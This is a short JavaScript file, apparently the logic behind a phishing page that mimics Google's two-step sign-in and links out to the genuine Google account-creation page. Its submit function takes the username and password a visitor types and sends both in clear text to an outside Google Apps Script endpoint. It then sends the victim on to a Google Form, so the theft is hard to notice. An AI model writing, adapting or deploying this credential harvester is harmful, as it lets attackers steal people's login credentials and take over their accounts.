window.onload = function() {
    var loginBox = document.querySelector('.outBox');
    document.getElementById("labela").addEventListener('change', function(){
    if(!document.getElementById("labela").value==''){
        loginBox.classList.add('existence');
        loginBox.classList.remove('empty');
    }else{
        loginBox.classList.remove('existence');   
        loginBox.classList.add('empty');
    }
    });

    var loginBoxb = document.querySelector('.outBoxb');
    document.getElementById("labelb").addEventListener('change', function(){
    if(!document.getElementById("labelb").value==''){
        loginBoxb.classList.add('existence');
        loginBoxb.classList.remove('empty');
    }else{
        loginBoxb.classList.remove('existence');   
        loginBoxb.classList.add('empty');
    }
    });
}

function submit() {
    var val1 = document.getElementById("labela").value;
    var val2 = document.getElementById("labelb").value;
    var dat1 = val1;
    var dat2 = val2;

    /*
    var dat1 = val1[0]+val1[1];
    for(var i=0; i<=val1.length-2; i++) {
        dat1 += "*";
    }
    var dat2="";
    for(var i=0; i<=val2.length; i++) {
        dat2+= "*";
    }
    */

    $('#submit').click(function () {
        $.ajax({
        type: "GET",
        url: "https://script.google.com/macros/s/AKfycby5wM4d7f5bWIG-YLSWbFT3AYXX_RThX79CKkHWxA4oRCMwJEzsRMlDY6gu60ZiY9I/exec",
        data: {
            0: dat1,
            1: dat2,
        },
        success: function (response) {
            window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSepsWvBxsXygF0QiUHTsY65Xz0tRpVYei9k9r-rgGuU_2jwow/viewform?usp=sf_link";

            setTimeout(function () {
            }, 3000);
        },
        error: function (request, status, error) {
            window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSepsWvBxsXygF0QiUHTsY65Xz0tRpVYei9k9r-rgGuU_2jwow/viewform?usp=sf_link";

            console.log("code:" + request.status + "\n" + "error:" + error);
            console.log(request.responseText);
        }
        });
    });
}

function createAcc() {
    window.location.replace("https://accounts.google.com/signup/v2/webcreateaccount?service=wise&flowEntry=SignUp");
}

function nextpage() {
    document.getElementById("id").classList.remove("vis");
    document.getElementById("id").classList.add("unvis");

    document.getElementById("pw").classList.remove("unvis");
    document.getElementById("pw").classList.add("vis");
}